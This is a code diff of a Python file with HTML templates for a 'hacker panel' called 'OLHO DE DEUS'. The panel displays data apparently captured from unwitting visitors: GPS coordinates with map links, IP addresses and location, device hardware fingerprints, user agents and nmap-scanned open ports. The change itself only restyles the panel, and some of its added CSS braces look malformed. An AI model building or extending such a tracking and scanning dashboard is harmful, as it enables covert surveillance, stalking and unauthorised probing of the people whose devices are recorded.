@@ -111,7 +111,7 @@ HTML_CAPTURA = f"""
 </html>
 """
 
-# Painel Hacker Mobile com Marca D'água "OLHO DE DEUS", Lista Zebrada, ID e Fontes Legíveis
+# Painel Hacker com fonte de blocos no fundo (Posicionada na região solicitada)
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -119,6 +119,9 @@ HTML_PAINEL = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MAINFRAME - OLHO DE DEUS</title>
+    <!-- Importando fonte de blocos estilo arcade/hacker idêntica à referência -->
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+    
     <style>
         body { 
             font-family: 'Courier New', Courier, monospace;
@@ -127,21 +130,28 @@ HTML_PAINEL = """
             background: #050505; 
             color: #00FF66; 
             position: relative;
+            min-height: 100vh;
         }
-        /* Marca d'água de fundo OLHO DE DEUS semi-transparente */
-        body::before {
-            content: "OLHO DE DEUS";
-            position: fixed;
-            top: 50%;
+        /* Marca d'água "OLHO DE DEUS" posicionada exatamente na área indicada */
+        .watermark-olho {{
+            position: absolute;
+            bottom: 10vh;
             left: 50%;
-            transform: translate(-50%, -50%) rotate(-30deg);
-            font-size: 14vw;
-            color: rgba(0, 255, 102, 0.03);
+            transform: translateX(-50%);
+            font-family: 'Press Start 2P', monospace;
+            font-size: 5vw;
+            color: rgba(0, 255, 102, 0.08);
             white-space: nowrap;
-            z-index: -1;
+            z-index: 0;
             pointer-events: none;
-            font-weight: bold;
+            text-align: center;
+            letter-spacing: 4px;
         }
+        /* Garante que o conteúdo fique acima da marca d'água */
+        .content-wrapper {{
+            position: relative;
+            z-index: 1;
+        }}
         h2 {
             color: #00FF66;
             font-size: 15px;
@@ -232,97 +242,101 @@ HTML_PAINEL = """
 </head>
 <body>
 
-<div class="status-box">
-    <b>[SYS_STATUS]</b> ONLINE-ACTIVE<br>
-    <b>[PROTOCOL]</b> SECURE TCP/IP | <b>REFRESH:</b> 5s
-</div>
+<div class="watermark-olho">OLHO DE DEUS</div>
 
-<div class="terminal-text">
-    identification division.<br>
-    program-id. MAINFRAME-SECURE-CONSOLE.<br>
-    author. PENTESTER-CORE.<br>
-    module. 06 - SCHEDULER & NMAP ENGINE
-</div>
+<div class="content-wrapper">
+    <div class="status-box">
+        <b>[SYS_STATUS]</b> ONLINE-ACTIVE<br>
+        <b>[PROTOCOL]</b> SECURE TCP/IP | <b>REFRESH:</b> 5s
+    </div>
 
-<h2>[ 01 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
-<div class="table-container">
-    <table>
-        <tr>
-            <th>ID</th>
-            <th>DATA / HORA</th>
-            <th>IP DE ORIGEM</th>
-            <th>LAT / LONG</th>
-            <th>PRECISÃO</th>
-            <th>MAPS</th>
-        </tr>
-        {% for r in gps %}
-        <tr>
-            <td><span class="id-tag">#{{ loop.revindex }}</span></td>
-            <td>{{ r.data }}</td>
-            <td><b>{{ r.ip }}</b></td>
-            <td>{{ r.lat }}, {{ r.lon }}</td>
-            <td>{{ r.precisao }}m</td>
-            <td><a href="{{ r.maps }}" target="_blank">🗺️ MAPA</a></td>
-        </tr>
-        {% else %}
-        <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO <<</td></tr>
-        {% endfor %}
-    </table>
-</div>
+    <div class="terminal-text">
+        identification division.<br>
+        program-id. MAINFRAME-SECURE-CONSOLE.<br>
+        author. PENTESTER-CORE.<br>
+        module. 06 - SCHEDULER & NMAP ENGINE
+    </div>
 
-<h2>[ 02 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
-<div class="table-container">
-    <table>
-        <tr>
-            <th>ID</th>
-            <th>DATA / HORA</th>
-            <th>IP / LOCALIZAÇÃO / ISP</th>
-            <th>HARDWARE & DISPOSITIVO</th>
-            <th>NAVEGADOR / USER-AGENT</th>
-            <th>PORTAS ABERTAS</th>
-        </tr>
-        {% for r in ips %}
-        <tr>
-            <td><span class="id-tag">#{{ loop.revindex }}</span></td>
-            <td>{{ r.data }}</td>
-            <td>
-                <b>{{ r.ip }}</b><br>
-                <span style="color: #3399FF;">{{ r.cidade }}/{{ r.estado }}</span><br>
-                <small>{{ r.isp }}</small><br>
-                Conexão: <b>{{ r.hw.connectionType }}</b>
-            </td>
-            <td>
-                Cores CPU: {{ r.hw.hardwareConcurrency }}<br>
-                RAM: {{ r.hw.deviceMemory }} GB<br>
-                Bateria: {{ r.hw.bateria }}<br>
-                Tela: {{ r.hw.resolucqao }}<br>
-                Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
-                Fuso: {{ r.hw.timezone }}
-            </td>
-            <td>
-                <b>OS:</b> {{ r.ua_info.os }}<br>
-                <b>Browser:</b> {{ r.ua_info.browser }}<br>
-                <b>Device:</b> {{ r.ua_info.device }}<br>
-                <b>Idioma:</b> {{ r.hw.language }}<br>
-                <details style="margin-top: 6px;">
-                    <summary>Ver User-Agent</summary>
-                    <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
-                </details>
-            </td>
-            <td>
-                {% if r.portas %}
-                    {% for p in r.portas %}
-                        <span class="badge">P.{{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
-                    {% endfor %}
-                {% else %}
-                    <span style="color: #FF5555;">Escaneando...</span>
-                {% endif %}
-            </td>
-        </tr>
-        {% else %}
-        <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM REGISTRO CAPTURADO <<</td></tr>
-        {% endfor %}
-    </table>
+    <h2>[ 01 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>ID</th>
+                <th>DATA / HORA</th>
+                <th>IP DE ORIGEM</th>
+                <th>LAT / LONG</th>
+                <th>PRECISÃO</th>
+                <th>MAPS</th>
+            </tr>
+            {% for r in gps %}
+            <tr>
+                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
+                <td>{{ r.data }}</td>
+                <td><b>{{ r.ip }}</b></td>
+                <td>{{ r.lat }}, {{ r.lon }}</td>
+                <td>{{ r.precisao }}m</td>
+                <td><a href="{{ r.maps }}" target="_blank">🗺️ MAPA</a></td>
+            </tr>
+            {% else %}
+            <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO <<</td></tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <h2>[ 02 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>ID</th>
+                <th>DATA / HORA</th>
+                <th>IP / LOCALIZAÇÃO / ISP</th>
+                <th>HARDWARE & DISPOSITIVO</th>
+                <th>NAVEGADOR / USER-AGENT</th>
+                <th>PORTAS ABERTAS</th>
+            </tr>
+            {% for r in ips %}
+            <tr>
+                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
+                <td>{{ r.data }}</td>
+                <td>
+                    <b>{{ r.ip }}</b><br>
+                    <span style="color: #3399FF;">{{ r.cidade }}/{{ r.estado }}</span><br>
+                    <small>{{ r.isp }}</small><br>
+                    Conexão: <b>{{ r.hw.connectionType }}</b>
+                </td>
+                <td>
+                    Cores CPU: {{ r.hw.hardwareConcurrency }}<br>
+                    RAM: {{ r.hw.deviceMemory }} GB<br>
+                    Bateria: {{ r.hw.bateria }}<br>
+                    Tela: {{ r.hw.resolucqao }}<br>
+                    Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
+                    Fuso: {{ r.hw.timezone }}
+                </td>
+                <td>
+                    <b>OS:</b> {{ r.ua_info.os }}<br>
+                    <b>Browser:</b> {{ r.ua_info.browser }}<br>
+                    <b>Device:</b> {{ r.ua_info.device }}<br>
+                    <b>Idioma:</b> {{ r.hw.language }}<br>
+                    <details style="margin-top: 6px;">
+                        <summary>Ver User-Agent</summary>
+                        <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
+                    </details>
+                </td>
+                <td>
+                    {% if r.portas %}
+                        {% for p in r.portas %}
+                            <span class="badge">P.{{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
+                        {% endfor %}
+                    {% else %}
+                        <span style="color: #FF5555;">Escaneando...</span>
+                    {% endif %}
+                </td>
+            </tr>
+            {% else %}
+            <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM REGISTRO CAPTURADO <<</td></tr>
+            {% endfor %}
+        </table>
+    </div>
 </div>
 
 <script>
